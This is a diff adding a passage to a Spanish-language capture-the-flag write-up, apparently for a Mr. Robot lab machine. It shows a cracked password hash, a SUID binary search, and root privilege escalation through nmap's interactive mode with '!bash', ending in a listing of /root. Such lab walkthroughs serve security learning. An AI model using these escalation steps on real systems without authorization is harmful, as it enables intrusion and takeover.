@@ -178,3 +178,35 @@ Dictionary cache hit:
 
 c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
 ```
+Buscaremos binarios con el SUID activado y buscaremos en GTFOBins si podemos explotar algún binario gracias al SUID.
+```bash
+robot@ip-10-10-51-184:/usr/local/bin$ find / -perm -4000 2>/dev/null
+/bin/umount
+/bin/mount
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+Nos centraremos en el binario de nmap, si lo buscamos en GTFOBins veremos que podemos explotar el SUID
+```bash
+robot@ip-10-10-51-184:/usr/local/bin$ ./nmap
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !bash
+root@ip-10-10-51-184:/usr/local/bin# cd /root
+root@ip-10-10-51-184:/root# ls
+firstboot_done  key-3-of-3.txt
+root@ip-10-10-51-184:/root#
+```
